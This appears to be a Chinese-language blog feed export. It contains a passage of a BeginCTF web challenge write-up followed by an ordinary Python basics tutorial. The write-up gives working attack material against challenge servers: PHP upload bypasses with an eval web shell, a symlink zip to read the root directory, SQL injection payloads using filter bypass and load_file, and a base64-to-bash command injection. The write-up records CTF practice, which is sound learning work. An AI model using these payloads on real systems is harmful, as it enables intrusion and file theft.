class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>) &amp;&amp; (<span class="keyword">new</span> <span class="title class_">ZipArchive</span>())-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$file_tmp</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证文件名最后一个<code>.</code>后的后缀名是否为zip, 增加了zip文件的有效性验证,并将file_get_contents改为include函数</p><p>只需要将恶意php文件压缩为zip,然后直接包含zip文件即可</p><p>include会将zip文件解析为php</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225145500.png" alt="image-20240131225145500"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240131225218914.png" alt="image-20240131225218914"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240201153444529.png" alt="image-20240201153444529"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><p>传软链接的压缩包</p><p>参考:<a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/</a></p><p>这里试了好几次传完软链接再传shell没成功,php不能被解析只能file_get_contents把php的内容带出来</p><p>实际上根本没必要rce阿,由于知道flag就在&#x2F;flag,直接传个软链接链接到根目录就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s / abc </span><br><span class="line">zip -y abc.zip abc</span><br></pre></td></tr></table></figure><p>之后传入abc.zip,直接访问&#x2F;uploads&#x2F;abc&#x2F;flag即可将flag下载下来</p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>额额 边简单了</p><p>直接绕过前端对.zip的限制就可以传入php文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:31393</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://101.32.220.189:31393/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------18159431502352910098131068589</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>282</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:31393</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>蚁剑连接cat &#x2F;flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145106152.png" alt="image-20240205145106152"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><p>依然是构造.zip.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:32767</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://101.32.220.189:32767/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------143906178423789204102969238846</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>276</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:32767</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.zip.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145735598.png" alt="image-20240205145735598"></p><h2 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(flag)/**/ffromrom/**/secret.passwoorrd%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(grade)ffromrom/**/ctf.scoorre/**/where/**/student/**/like/**/&#x27;begin&#x27;%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/lloadoad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure><p>这里又想去rce看&#x2F;flag了,,,,,,,</p><p>忘记了load_file()</p><h2 id="readbooks-未解出"><a href="#readbooks-未解出" class="headerlink" title="readbooks(未解出)"></a>readbooks(未解出)</h2><p>虽然未找到flag但是payload是一点没问题()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/list/a||ec&#x27;&#x27;ho$&#123;IFS&#125;&#x27;Y2F0IC9fZmxhZw&#x27;|bas&#x27;&#x27;e64$&#123;IFS&#125;-d|ba&#x27;&#x27;sh</span><br></pre></td></tr></table></figure><p>这里已经rce了,但是里面没找到(感觉真的没有)flag,,,,</p><h2 id="pickelshop-未解出"><a href="#pickelshop-未解出" class="headerlink" title="pickelshop(未解出)"></a>pickelshop(未解出)</h2><p>拿到注册返回的cookie可以登录</p><p>感觉要解码,,不太会</p><h2 id="king-未解出"><a href="#king-未解出" class="headerlink" title="king(未解出)"></a>king(未解出)</h2><p>抓包了web Socket的流量, 看了MongoDB语法, 还是不知道怎么注入,,,</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BeginCTF（自由赛道）&quot;&gt;&lt;a href=&quot;#BeginCTF（自由赛道）&quot; class=&quot;headerlink&quot; title=&quot;BeginCTF（自由赛道）&quot;&gt;&lt;/a&gt;BeginCTF（自由赛道）&lt;/h1&gt;&lt;h2 id=&quot;POPgadget&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
    <category term="nosql注入" scheme="http://example.com/tags/nosql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="命令注入" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>python基础</title>
    <link href="http://example.com/2024/01/29/python%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/29/python%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-29T03:05:15.000Z</published>
    <updated>2024-01-29T15:40:47.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><p>之间也学过一些python编程基础,但大都是零散碎片化的知识</p><p>故在此系统地记录一下python的基本语法以及常见的操作</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>首先是一些基础语法,如 赋值, 四则运算, 选择分支, 循环, 嵌套</p><p>由于与其他语言大部分都重复, 这里只写一个简单的示例程序来演示这些基本操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">2025</span>):</span><br><span class="line">    <span class="keyword">if</span> year % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> year % <span class="number">100</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年是闰年&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> year % <span class="number">400</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年是闰年&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年不是闰年&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果显而易见</p><p>特别的,python中有<code>/</code>和<code>//</code>两种除法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#-0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#0</span></span><br><span class="line"><span class="built_in">print</span>(-<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#-1</span></span><br></pre></td></tr></table></figure><p>显然, <code>/</code>执行了浮点运算,而<code>//</code>则是__向下取整__</p><h2 id="列表-List"><a href="#列表-List" class="headerlink" title="列表(List)"></a>列表(List)</h2><p>举例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br></pre></td></tr></table></figure><p>有以下几种切片方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:])    <span class="comment"># 打印索引为1元素后的所有元素(包含索引为1的元素) </span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:<span class="number">5</span>])   <span class="comment"># 左闭右开</span></span><br><span class="line"><span class="built_in">print</span>(list1[:<span class="number">5</span>])    <span class="comment"># 打印索引为5元素前的所有元素(不包含索引为5的元素)</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">1</span>])    <span class="comment"># 最后一个元素的索引为-1,以此类推</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;, &#x27;hcl&#x27;]</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">[1, 2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">hcl</span><br></pre></td></tr></table></figure><h3 id="列表操作"><a href="#列表操作" class="headerlink" title="列表操作"></a>列表操作</h3><h4 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list1.append(<span class="string">&#x27;cabbage&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#输出: [1, 2, 3, &#x27;cabbage&#x27;]</span></span><br></pre></td></tr></table></figure><h4 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;cabbage&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> list1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#输出: [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h4 id="列表操作符"><a href="#列表操作符" class="headerlink" title="列表操作符"></a>列表操作符</h4><p>常用的就是<code>+</code>拼接,<code>in</code>判断某元素是否在列表中, 这里搬运一下菜鸟教程上的一个表格</p><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len([1, 2, 3])</td><td align="left">3</td><td align="left">长度</td></tr><tr><td align="left">[1, 2, 3] + [4, 5, 6]</td><td align="left">[1, 2, 3, 4, 5, 6]</td><td align="left">组合</td></tr><tr><td align="left">[‘Hi!’] * 4</td><td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td align="left">重复</td></tr><tr><td align="left">3 in [1, 2, 3]</td><td align="left">True</td><td align="left">元素是否存在于列表中</td></tr><tr><td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table><h4 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h4><p>列表是可以嵌套存在的, 即列表中的元素也可以是列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, [<span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>], <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[&#x27;nacl&#x27;, &#x27;cabbage&#x27;]</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>这里的第二个元素(索引为1)就被声明成了一个有两个元素的列表</p><p>__更多列表相关的函数与方法:__<a href="https://www.runoob.com/python3/python3-list.html">https://www.runoob.com/python3/python3-list.html</a></p><h2 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h2><p>与list相似, 元组是一些元素的集合, 但是元组不可修改</p><p>元组中只包含一个元素时，需要在元素后面添加逗号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="number">50</span>,)</span><br></pre></td></tr></table></figure><p>元组的访问方式与list相同, 即都是使用<code>[]</code>并加上索引来访问</p><h3 id="无关闭分隔符"><a href="#无关闭分隔符" class="headerlink" title="无关闭分隔符"></a>无关闭分隔符</h3><p>任意无符号的对象，以逗号隔开，默认为元组</p><p>…说实话没太理解,它给出了一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;abc&#x27;</span>, -<span class="number">4.24e93</span>, <span class="number">18</span>+<span class="number">6.6j</span>, <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line">x, y = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Value of x , y : &quot;</span>, x,y</span><br></pre></td></tr></table></figure><p>以上实例运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc -4.24e+93 (18+6.6j) xyz</span><br><span class="line">Value of x , y : 1 2</span><br></pre></td></tr></table></figure><h3 id="元组内置函数"><a href="#元组内置函数" class="headerlink" title="元组内置函数"></a>元组内置函数</h3><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-cmp.html">cmp(tuple1, tuple2)</a> 比较两个元组元素。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-len.html">len(tuple)</a> 计算元组元素个数。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-max.html">max(tuple)</a> 返回元组中元素最大值。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-min.html">min(tuple)</a> 返回元组中元素最小值。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-tuple.html">tuple(seq)</a> 将列表转换为元组。</td></tr></tbody></table><h2 id="字典-Dictionary"><a href="#字典-Dictionary" class="headerlink" title="字典(Dictionary)"></a>字典(Dictionary)</h2><p>字典采用键值对的方式来存储任意类型的对象</p><p>举例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;alice&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;mike&#x27;</span>: <span class="string">&#x27;43210&#x27;</span>, <span class="string">&#x27;bob&#x27;</span>: <span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;default&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&#x27;alice&#x27;</span>])</span><br><span class="line"><span class="comment"># 输出: 12345</span></span><br></pre></td></tr></table></figure><p>仍然采用<code>[]</code>来访问,只不过索引为要访问元素的键名</p><h3 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tinydict[<span class="string">&#x27;Age&#x27;</span>] = <span class="number">8</span> <span class="comment"># 更新</span></span><br><span class="line">tinydict[<span class="string">&#x27;School&#x27;</span>] = <span class="string">&quot;RUNOOB&quot;</span> <span class="comment"># 添加</span></span><br><span class="line"><span class="keyword">del</span> tinydict[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line">tinydict.clear()      <span class="comment"># 清空字典所有条目</span></span><br><span class="line"><span class="keyword">del</span> tinydict          <span class="comment"># 删除字典</span></span><br></pre></td></tr></table></figure><h3 id="字典特性"><a href="#字典特性" class="headerlink" title="字典特性"></a>字典特性</h3><p>字典值可以是任何的 python 对象，既可以是标准的对象，也可以是用户定义的，但键不行</p><p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</p><p>2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行</p><p>更多: </p><p><a href="https://www.runoob.com/python3/python3-dictionary.html">https://www.runoob.com/python3/python3-dictionary.html</a></p><h2 id="集合-set"><a href="#集合-set" class="headerlink" title="集合(set)"></a>集合(set)</h2><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">words = &#123;<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>&#125;</span><br><span class="line">words.add(<span class="string">&#x27;rabbit&#x27;</span>)<span class="comment">#添加</span></span><br><span class="line">words.update([<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment">#参数可以是列表，元组，字典等，语法格式如下</span></span><br><span class="line">words.remove(<span class="string">&#x27;cabbage&#x27;</span>)<span class="comment">#删除</span></span><br><span class="line">s.discard(<span class="string">&#x27;cat&#x27;</span>)<span class="comment">#此方法删除元素时如果元素不存在，不会发生错误</span></span><br><span class="line"><span class="built_in">print</span>(words)</span><br><span class="line">输出:&#123;<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-add.html">add()</a></td><td align="left">为集合添加元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-clear.html">clear()</a></td><td align="left">移除集合中的所有元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-copy.html">copy()</a></td><td align="left">拷贝一个集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference.html">difference()</a></td><td align="left">返回多个集合的差集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference_update.html">difference_update()</a></td><td align="left">移除集合中的元素，该元素在指定的集合也存在。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-discard.html">discard()</a></td><td align="left">删除集合中指定的元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection.html">intersection()</a></td><td align="left">返回集合的交集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection_update.html">intersection_update()</a></td><td align="left">返回集合的交集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-isdisjoint.html">isdisjoint()</a></td><td align="left">判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。</td></tr><tr><td 